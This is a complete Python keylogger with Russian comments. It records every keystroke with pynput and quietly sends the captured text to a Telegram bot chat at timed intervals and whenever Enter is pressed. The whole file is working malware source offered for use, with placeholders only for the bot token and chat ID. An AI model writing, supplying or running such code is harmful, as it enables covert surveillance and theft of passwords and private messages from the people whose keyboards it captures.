import threading
import time
import requests
from pynput import keyboard

# ================= НАСТРОЙКИ =================
TELEGRAM_TOKEN = "ВАШ_ТОКЕН_БОТА"
CHAT_ID = "ВАШ_CHAT_ID"          # число или строка с числом
SEND_INTERVAL = 10               # секунд между автоматическими отправками
# ==============================================

class TelegramKeylogger:
    def __init__(self, token, chat_id, interval=10):
        self.token = token
        self.chat_id = chat_id
        self.interval = interval
        self.buffer = []          # список символов
        self.lock = threading.Lock()
        self.listener = None
        self.timer = None

    def _send_message(self, text):
        """Отправка сообщения через Telegram Bot API."""
        url = f"https://api.telegram.org/bot{self.token}/sendMessage"
        payload = {
            "chat_id": self.chat_id,
            "text": text or "(пустая строка)",
            "disable_notification": True
        }
        try:
            requests.post(url, json=payload, timeout=5)
        except Exception as e:
            print(f"[!] Ошибка отправки: {e}")

    def _flush_buffer(self):
        """Отправляет накопленный буфер и очищает его."""
        with self.lock:
            if not self.buffer:
                return
            text = "".join(self.buffer)
            self.buffer.clear()
        self._send_message(text)

    def _timer_flush(self):
        """Фоновая отправка по таймеру."""
        while self.listener and self.listener.is_alive():
            time.sleep(self.interval)
            self._flush_buffer()

    def _on_press(self, key):
        """Обработчик нажатия клавиши."""
        try:
            # Обычные символы
            char = key.char
            if char is not None:
                with self.lock:
                    self.buffer.append(char)
        except AttributeError:
            # Специальные клавиши
            if key == keyboard.Key.space:
                with self.lock:
                    self.buffer.append(" ")
            elif key == keyboard.Key.enter:
                with self.lock:
                    self.buffer.append("\n")
                # При Enter сразу отправляем накопленное
                self._flush_buffer()
            elif key == keyboard.Key.backspace:
                with self.lock:
                    if self.buffer:
                        self.buffer.pop()
            elif key == keyboard.Key.tab:
                with self.lock:
                    self.buffer.append("[TAB]")
            # Остальные специальные клавиши можно логировать по желанию:
            # elif key == keyboard.Key.esc:
            #     self.buffer.append("[ESC]")
            # ... и т.д.

    def start(self):
        """Запуск перехвата клавиатуры."""
        self.listener = keyboard.Listener(on_press=self._on_press)
        self.listener.start()

        # Запускаем фоновый таймер для периодической отправки
        self.timer = threading.Thread(target=self._timer_flush, daemon=True)
        self.timer.start()

        print("[*] Кейлоггер запущен. Нажмите Ctrl+C для остановки.")
        try:
            self.listener.join()
        except KeyboardInterrupt:
            print("\n[*] Остановка...")
            self.stop()

    def stop(self):
        """Корректная остановка и отправка остатков буфера."""
        if self.listener:
            self.listener.stop()
        self._flush_buffer()
        print("[*] Остановлен.")

if __name__ == "__main__":
    logger = TelegramKeylogger(TELEGRAM_TOKEN, CHAT_ID, SEND_INTERVAL)
    logger.start()